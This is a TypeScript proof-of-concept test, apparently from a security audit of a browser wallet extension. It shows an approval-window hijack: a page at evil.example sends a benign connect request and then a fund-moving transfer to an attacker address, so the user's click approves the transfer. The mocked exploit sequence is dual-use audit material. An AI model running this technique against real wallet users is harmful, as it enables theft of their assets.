/**
 * Independent re-audit PoC: approval-window hijacking.
 *
 * approvalController.openApprovalWindow() REUSES an already-open approval
 * window by navigating it (chrome.tabs.update) to the new request's URL.
 * A malicious dApp can therefore issue a benign request (DAPP_CONNECT),
 * wait for the user to move to the Approve button, then issue a
 * fund-moving request. The window under the user's cursor silently
 * becomes the second request, and the click approves it.
 */
import assert from 'node:assert';

let windowCounter = 0;
const nav: string[] = [];        // every URL the approval window was pointed at
const openWindows = new Map<number, { tabs: Array<{ id: number; url: string }> }>();
let sessionStore: any = {};

(globalThis as any).chrome = {
  runtime: {
    id: 'mockid',
    getURL: (p: string) => `chrome-extension://mockid/${p}`,
  },
  storage: {
    local: { get: async () => ({}), set: async () => ({}) },
    session: {
      get: async (k: string) => ({ [k]: sessionStore[k] }),
      set: async (o: any) => { Object.assign(sessionStore, o); },
      remove: async (k: string) => { delete sessionStore[k]; },
    },
  },
  windows: {
    onRemoved: { addListener: () => {} },
    create: async ({ url }: any) => {
      const id = ++windowCounter;
      openWindows.set(id, { tabs: [{ id: id * 100, url }] });
      nav.push(url);
      return { id };
    },
    get: async (id: number) => {
      const w = openWindows.get(id);
      if (!w) throw new Error('no such window');
      return { id, tabs: w.tabs };
    },
    update: async () => {},
    remove: async (id: number) => { openWindows.delete(id); },
  },
  tabs: {
    create: async ({ url }: any) => { nav.push(url); return { id: 1 }; },
    update: async (tabId: number, { url }: any) => {
      for (const w of openWindows.values()) {
        const t = w.tabs.find((t) => t.id === tabId);
        if (t) t.url = url;
      }
      nav.push(url);
      return { id: tabId };
    },
  },
};

const { approvalController } = await import('../src/background/approvalController');

function idFrom(url: string) {
  return new URL(url).searchParams.get('request')!;
}

console.log('Approval-window hijack PoC\n');

// 1. Malicious page asks to connect. User sees this and reaches for "Approve".
let benignSettled: string | null = null;
const benign = approvalController
  .requestApproval('DAPP_CONNECT', { origin: 'https://evil.example' }, 'https://evil.example')
  .then(() => { benignSettled = 'approved'; })
  .catch((e) => { benignSettled = 'rejected: ' + e.message; });

await new Promise((r) => setTimeout(r, 10));
const firstUrl = nav[nav.length - 1];
console.log('  user is looking at :', firstUrl);

// 2. Before the click lands, the same page fires a fund-moving request.
let drainSettled: string | null = null;
const drain = approvalController
  .requestApproval(
    'DAPP_TRANSFER_GLYPH_L1',
    { toAddress: 'S_ATTACKER_ADDRESS', glyphHash: 'rare-glyph', edition: 1 },
    'https://evil.example'
  )
  .then(() => { drainSettled = 'APPROVED'; })
  .catch((e) => { drainSettled = 'rejected: ' + e.message; });

await new Promise((r) => setTimeout(r, 10));
const secondUrl = nav[nav.length - 1];
console.log('  window now shows  :', secondUrl);

const sameWindow = openWindows.size === 1;
console.log('\n  approval windows open:', openWindows.size, sameWindow ? '(REUSED - navigated in place)' : '(separate windows)');

// 3. The user's click lands on the window they were already looking at.
//    The popup reloads on navigation and resolves whatever ?request= now says.
await approvalController.resolveApproval(idFrom(secondUrl), true);
await new Promise((r) => setTimeout(r, 10));

console.log('\n  DAPP_CONNECT           ->', benignSettled ?? 'still pending (never rejected)');
console.log('  DAPP_TRANSFER_GLYPH_L1 ->', drainSettled);

console.log('\n--- verdict ---');
assert.strictEqual(sameWindow, true, 'expected window reuse');
assert.strictEqual(drainSettled, 'APPROVED');
assert.strictEqual(benignSettled, null, 'superseded request is never rejected');
console.log('CONFIRMED: a second request silently replaces the one the user is looking at,');
console.log('           the superseded request is left pending forever, and the click');
console.log('           approves the attacker-chosen transfer.');

void benign; void drain;
process.exit(0);
